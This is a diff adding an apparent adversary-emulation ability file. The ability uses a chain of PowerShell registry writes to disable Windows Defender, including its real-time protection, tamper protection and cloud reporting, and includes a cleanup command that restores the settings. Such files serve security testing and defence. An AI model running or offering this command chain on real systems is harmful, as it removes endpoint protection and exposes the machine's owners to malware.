@@ -1,0 +1,72 @@
+---
+- id: bfbaa9c720efc114513ddd5aab57a872
+  name: Tamper with Windows Defender Registry - Powershell
+  description: 'Disable Windows Defender by tampering with windows defender registry
+    through powershell
+
+    '
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      psh:
+        command: Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender"
+          -Name "DisableAntiSpyware" -Value 1 ; Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows
+          Defender" -Name "DisableAntiVirus" -Value 1 ; Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows
+          Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value
+          1 ; Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time
+          Protection" -Name "DisableIntrusionPreventionSystem" -Value 1 ; Set-ItemProperty
+          "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"
+          -Name "DisableIOAVProtection" -Value 1 ; Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows
+          Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value
+          1 ; Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time
+          Protection" -Name "DisableRealtimeMonitoring" -Value 1 ; Set-ItemProperty
+          "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"
+          -Name "DisableRoutinelyTakingAction" -Value 1 ; Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows
+          Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value
+          1 ; Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time
+          Protection" -Name "DisableScriptScanning" -Value 1 ; Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows
+          Defender\Reporting" -Name "DisableEnhancedNotifications" -Value 1  ; Set-ItemProperty
+          "HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet" -Name "DisableBlockAtFirstSeen"
+          -Value 1 ; Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet"
+          -Name "SpynetReporting" -Value 0 ; Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows
+          Defender\MpEngine" -Name "MpEnablePus" -Value 0 ; Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows
+          Defender Security Center\App and Browser protection" -Name "DisallowExploitProtectionOverride"
+          -Value 0 ; Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
+          -Name "TamperProtection"  -Value 0 ; Set-ItemProperty "HKLM:\software\microsoft\windows
+          defender\spynet" -Name "SubmitSamplesConsent" -Value 0 ; Set-ItemProperty
+          "HKLM:\Software\Microsoft\Windows Defender" -Name "PUAProtection" -Value
+          0
+        payloads: []
+        cleanup: Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender"
+          -Name "DisableAntiSpyware" -Value 0 ; Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows
+          Defender" -Name "DisableAntiVirus" -Value 0; Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows
+          Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value
+          0 ; Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time
+          Protection" -Name "DisableIntrusionPreventionSystem" -Value 0; Set-ItemProperty
+          "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"
+          -Name "DisableIOAVProtection" -Value 0 ; Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows
+          Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value
+          0 ; Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time
+          Protection" -Name "DisableRealtimeMonitoring" -Value 0 ; Set-ItemProperty
+          "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"
+          -Name "DisableRoutinelyTakingAction" -Value 0 ; Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows
+          Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value
+          0 ; Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time
+          Protection" -Name "DisableScriptScanning" -Value 0 ; Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows
+          Defender\Reporting" -Name "DisableEnhancedNotifications" -Value 0  ; Set-ItemProperty
+          "HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet" -Name "DisableBlockAtFirstSeen"
+          -Value 0; Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows Defender\SpyNet"
+          -Name "SpynetReporting" -Value 1 ; Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows
+          Defender\MpEngine" -Name "MpEnablePus" -Value 1 ; Set-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows
+          Defender Security Center\App and Browser protection" -Name "DisallowExploitProtectionOverride"
+          -Value 1 ; Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
+          -Name "TamperProtection"  -Value 1; Set-ItemProperty "HKLM:\software\microsoft\windows
+          defender\spynet" -Name "SubmitSamplesConsent" -Value 1 ; Set-ItemProperty
+          "HKLM:\Software\Microsoft\Windows Defender" -Name "PUAProtection" -Value
+          1
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
